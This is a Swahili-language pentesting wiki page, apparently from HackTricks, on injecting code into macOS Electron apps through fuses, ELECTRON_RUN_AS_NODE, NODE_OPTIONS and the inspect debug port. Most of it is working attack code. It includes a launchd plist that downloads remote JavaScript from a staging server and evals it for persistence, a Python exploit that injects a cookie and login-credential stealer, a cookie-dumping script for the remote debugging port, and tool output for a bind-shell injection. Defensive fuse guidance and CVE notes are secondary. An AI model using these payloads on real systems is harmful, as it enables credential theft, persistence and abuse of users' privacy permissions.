# Injection ya Electron Applications kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

Ikiwa hujui Electron ni nini, unaweza kupata [**maelezo mengi hapa**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Lakini kwa sasa, fahamu tu kwamba Electron huendesha **node**.\
Na node ina baadhi ya **parameters** na **env variables** zinazoweza kutumiwa **kuifanya itekeleze code nyingine** kando na file iliyoonyeshwa.

### Electron Fuses

Mbinu hizi zitajadiliwa baadaye, lakini katika nyakati za hivi karibuni Electron imeongeza **security flags** kadhaa za **kuzizuia**. Hizi ndizo [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), na hizi ndizo zinazotumika **kuzuia** Electron apps kwenye macOS **kupakia arbitrary code**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Ikiwa imezimwa, huzuia matumizi ya env var **`ELECTRON_RUN_AS_NODE`** kwa ajili ya ku-inject code.
- **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, params kama `--inspect`, `--inspect-brk` hazitazingatiwa. Hii huzuia njia hii ya ku-inject code.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewashwa, **`asar`** **file** iliyopakiwa **itathibitishwa** na macOS. Kwa njia hii **code injection** inayotokana na kurekebisha maudhui ya file hii **inazuiwa**.
- **`OnlyLoadAppFromAsar`**: Ikiwa hii imewashwa, badala ya kutafuta na kupakia kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**, itaangalia na kutumia app.asar pekee. Hivyo inahakikisha kwamba inapounganishwa na fuse ya **`embeddedAsarIntegrityValidation`**, haiwezekani **kupakia code ambayo haijathibitishwa**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewashwa, browser process hutumia file inayoitwa `browser_v8_context_snapshot.bin` kwa ajili ya V8 snapshot yake.

Fuse nyingine ya kuvutia ambayo haitazuia code injection ni:

- **EnableCookieEncryption**: Ikiwa imewashwa, cookie store iliyo kwenye disk husimbwa kwa kutumia OS level cryptography keys.

### Kuangalia Electron Fuses

Unaweza **kuangalia flags hizi** kutoka kwenye application kwa kutumia:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Electron Fuses

Kama [**nyaraka zinavyotaja**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Electron Fuses** huwekwa ndani ya **Electron binary**, ambayo mahali fulani huwa na string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Katika applications za macOS, kwa kawaida hupatikana kwenye `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Unaweza kupakia faili hili katika [https://hexed.it/](https://hexed.it/) na kutafuta string iliyotangulia. Baada ya string hii, unaweza kuona katika ASCII nambari "0" au "1" inayoonyesha ikiwa kila fuse imezimwa au imewashwa. Rekebisha tu hex code (`0x30` ni `0` na `0x31` ni `1`) ili **kurekebisha thamani za fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Kumbuka kuwa ukijaribu **ku-overwrite** binary ya **`Electron Framework`** ndani ya application yenye bytes hizi zilizorekebishwa, app haitafanya kazi.

## RCE: Kuongeza code kwenye Electron Applications

Kunaweza kuwa na **external JS/HTML files** ambazo Electron App inatumia, hivyo attacker anaweza ku-inject code katika mafaili haya, ambayo signature yake haitakaguliwa, na kutekeleza arbitrary code katika context ya app.

> [!CAUTION]
> Hata hivyo, kwa sasa kuna vikwazo 2:
>
> - Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** **inahitajika** ili kurekebisha App, hivyo kwa default hili haliwezekani tena.
> - Faili ya **`asap`** iliyocompile huwa na fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** zikiwa **enabled**
>
> Hii hufanya njia hii ya attack kuwa ngumu zaidi (au isiwezekane).

Kumbuka kuwa inawezekana ku-bypass hitaji la **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili application kwenye directory nyingine (kama **`/tmp`**), kubadilisha jina la folder **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kurekebisha** faili ya **asar** kwa code yako ya **malicious**, kuibadilisha tena kuwa **`app.app/Contents`**, kisha kuitekeleza.<sup>[[5]](#references)</sup>

Unaweza unpack code kutoka kwenye faili ya asar kwa kutumia:
```bash
npx asar extract app.asar app-decomp
```
Na i-pack tena baada ya kuirekebisha kwa:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE kwa kutumia ELECTRON_RUN_AS_NODE

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ikiwa env variable hii imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ikiwa **`RunAsNode`** imezimwa, env var **`ELECTRON_RUN_AS_NODE`** itapuuzwa, na hii haitafanya kazi.

### Injection kutoka kwa App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia vibaya env variable hii katika plist ili kudumisha persistence:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** **imezimwa**, app itapuuza env var **NODE_OPTIONS** inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** iwekwe, ambayo pia itapuuzwa ikiwa fuse **`RunAsNode`** imezimwa.
>
> Usipoweka **`ELECTRON_RUN_AS_NODE`** , utapata **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection kutoka kwenye App Plist

Unaweza kutumia vibaya env variable hii katika plist ili kudumisha persistence kwa kuongeza keys hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE kwa kutumia inspecting

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukiendesha programu ya Electron ikiwa na flags kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **debug port itakuwa wazi** ili uweze kuunganishwa nayo (kwa mfano kupitia Chrome kwenye `chrome://inspect`) na utaweza **kuingiza code ndani yake** au hata kuzindua michakato mipya.<sup>[[7]](#references)</sup>\
Kwa mfano:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Katika [**chapisho hili la blogu**](https://hackerone.com/reports/1274695), debugging hii inatumiwa vibaya kuifanya headless chrome **ipakue faili kiholela katika maeneo yoyote**.<sup>[[8]](#references)</sup>

> [!TIP]
> Ikiwa app ina njia yake maalum ya kuangalia ikiwa env variables au params kama `--inspect` zimewekwa, unaweza kujaribu **kuipita** wakati wa runtime ukitumia arg `--inspect-brk`, ambayo **itasimamisha utekelezaji** mwanzoni mwa app na kutekeleza bypass (kwa mfano, kuandika upya args au env variables za process ya sasa).

Ifuatayo ilikuwa exploit ambapo, kwa ku-monitor na kutekeleza app kwa param `--inspect-brk`, iliwezekana kupita ulinzi maalum uliokuwa umewekwa (kuandika upya params za process ili kuondoa `--inspect-brk`) na kisha ku-inject JS payload ya kudump cookies na credentials kutoka kwenye app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, app ita **puuza node parameters** (kama vile `--inspect`) inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** iwe imewekwa, ambayo pia itapuuzwa ikiwa fuse **`RunAsNode`** imezimwa.
>
> Hata hivyo, bado unaweza kutumia **electron param `--remote-debugging-port=9229`** lakini payload ya awali haitafanya kazi ya kutekeleza michakato mingine.

Kwa kutumia param **`--remote-debugging-port=9222`**, inawezekana kuiba baadhi ya taarifa kutoka kwenye Electron App, kama vile **history** (kwa kutumia **GET commands**) au **cookies** za browser (kwa kuwa **zimesimbuliwa** ndani ya browser na kuna **json endpoint** itakayozitoa).

Unaweza kujifunza jinsi ya kufanya hivyo [hapa](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [hapa](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), na kutumia tool ya kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection kutoka kwenye App Plist

Unaweza kutumia vibaya env variable hii katika plist ili kudumisha persistence kwa kuongeza keys hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass kwa kutumia Matoleo ya Zamani

> [!TIP]
> TCC daemon ya macOS haiangalii version ya application iliyotekelezwa. Kwa hiyo, ikiwa **huwezi ku-inject code kwenye Electron application** kwa kutumia mojawapo ya techniques zilizotangulia, unaweza kupakua version ya zamani ya APP na ku-inject code ndani yake, kwa kuwa bado itapata TCC privileges (isipokuwa Trust Cache izuie).

## Kuendesha Code isiyo ya JS

Techniques zilizotangulia zitakuruhusu kuendesha **JS code ndani ya process ya electron application**. Hata hivyo, kumbuka kwamba **child processes huendeshwa chini ya sandbox profile ileile** ya parent application na **hurithi TCC permissions zake**.\
Kwa hiyo, ikiwa unataka kutumia vibaya entitlements ili kufikia camera au microphone kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwenye process**.

## Vulnerabilities Muhimu za Electron macOS (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 na pre-releases mbalimbali za 23-27 zilimruhusu attacker mwenye write access kwenye folder la `.app/Contents/Resources` ku-bypass fuses za `embeddedAsarIntegrityValidation` **na** `onlyLoadAppFromAsar`. Bug ilikuwa *file-type confusion* kwenye integrity checker, ambayo iliruhusu **directory iliyotengenezwa yenye jina `app.asar`** kupakiwa badala ya archive iliyothibitishwa, hivyo JavaScript yoyote iliyowekwa ndani ya directory hiyo ilitekelezwa app ilipoanza. Kwa hiyo, hata vendors waliokuwa wamefuata hardening guidance na kuwezesha fuses zote mbili bado walikuwa vulnerable kwenye macOS.<sup>[[3]](#references)</sup>

Electron versions zilizopatiwa patch: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** na **27.0.0-alpha.7**. Attackers wanaopata application inayotumia build ya zamani wanaweza kubadilisha `Contents/Resources/app.asar` na directory yao wenyewe ili kuendesha code ikiwa na TCC entitlements za application.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

Mnamo Januari 2024, mfululizo wa CVEs (CVE-2024-23738 hadi CVE-2024-23743) ulionyesha kwamba Electron apps nyingi husafirishwa zikiwa bado zimewezesha fuses za **RunAsNode** na **EnableNodeCliInspectArguments**. Kwa hiyo, local attacker anaweza ku-relaunch program kwa environment variable `ELECTRON_RUN_AS_NODE=1` au flags kama `--inspect-brk` ili kuibadilisha kuwa process ya *generic* Node.js na kurithi sandbox na TCC permissions zote za application.<sup>[[4]](#references)</sup>

Ingawa Electron team ilipinga rating ya “critical” na kubainisha kwamba attacker tayari anahitaji local code–execution, issue hii bado ni muhimu wakati wa post-exploitation kwa sababu hubadilisha Electron bundle yoyote iliyo vulnerable kuwa binary ya *living-off-the-land*, ambayo inaweza kwa mfano kusoma Contacts, Photos au resources nyingine nyeti ambazo hapo awali zilipewa desktop app.<sup>[[4]](#references)</sup>

Mwongozo wa kujilinda kutoka kwa Electron maintainers:<sup>[[4]](#references)</sup>

* Disable fuses za `RunAsNode` na `EnableNodeCliInspectArguments` kwenye production builds.
* Tumia API mpya ya **UtilityProcess** ikiwa application yako inahitaji kihalali helper Node.js process badala ya kuwezesha tena fuses hizo.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi **kutafuta electron applications zilizo vulnerable** zilizowekwa na ku-inject code ndani yake. Tool hii itajaribu kutumia technique ya **`--inspect`**:<sup>[[5]](#references)</sup>

Unahitaji ku-compile mwenyewe na unaweza kuitumia hivi:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki iliundwa kuweka backdoor kwenye Electron applications kwa kubadilisha faili za JavaScript za applications hizo na faili za JavaScript za Loki Command & Control.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection ya macOS kupitia Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass kupitia mkanganyiko wa aina ya faili (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Taarifa kuhusu CVEs za 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing Privacy ya macOS - Silaha mpya katika zana yako ya Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Kwa nini Electron apps haziwezi kuhifadhi secrets zako kwa usiri: chaguo la --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Debugging ya Electron ilitumiwa vibaya kupakua faili za kiholela](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Kutupa Cookies kwa Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Kutatua Hitilafu za Cookie Dumping kwa Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
